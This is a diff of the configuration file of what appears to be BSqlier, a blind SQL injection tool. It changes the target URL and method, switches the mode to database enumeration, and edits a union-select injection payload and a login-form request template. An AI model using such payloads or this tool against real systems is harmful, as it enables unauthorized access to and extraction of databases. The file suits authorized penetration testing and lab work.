@@ -44,7 +44,7 @@ class BaseConfig:
         self.version = "V0.8.0"
 
         # 目标url
-        self.url = 'http://demo.lorexxar.pw/post.php'
+        self.url = 'http://demo.lorexxar.pw/get.php'
         self.s = requests.Session()
 
         # 传参方式 0为GET 1为POST
@@ -52,7 +52,7 @@ class BaseConfig:
             "GET",
             "POST"
         )
-        self.sqlirequest = SqliRequest[1]
+        self.sqlirequest = SqliRequest[0]
 
         '''
         当传参方式为GET
@@ -100,8 +100,8 @@ class BaseConfig:
         self.wtest = True
 
         self.testmethod = {
-            "test": 1,
-            "database": 0,
+            "test": 0,
+            "database": 1,
             "version": 0,
             "user": 0
         }
@@ -156,15 +156,15 @@ class BaseConfig:
         payload===>替换为指定payload===>自定义替换表===>请求===>开始注入
 
         '''
-        self.payload = "padding' union select 1,'BSqlier' limit 0,1#"
+        self.payload = "padding' union select 1,'BSqlier' #"
 
         '''
         配置请求,把请求中payload的位置设置为BSqlier（如果拼错了就会全部无效...）
         self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
         self.requesetformat = {"user": "BSqlier", "password": "a"}
         '''
-        # self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
-        self.requesetformat = {"user": "BSqlier", "password": "a"}
+        self.requesetformat = "user=BSqlier&passwd=ddog123&submit=Log+In"
+        # self.requesetformat = {"user": "BSqlier", "password": "a"}
         '''
         配置自定义替换表,合理的替换表配置远远可以替换出想要的所有情况payload
         '''
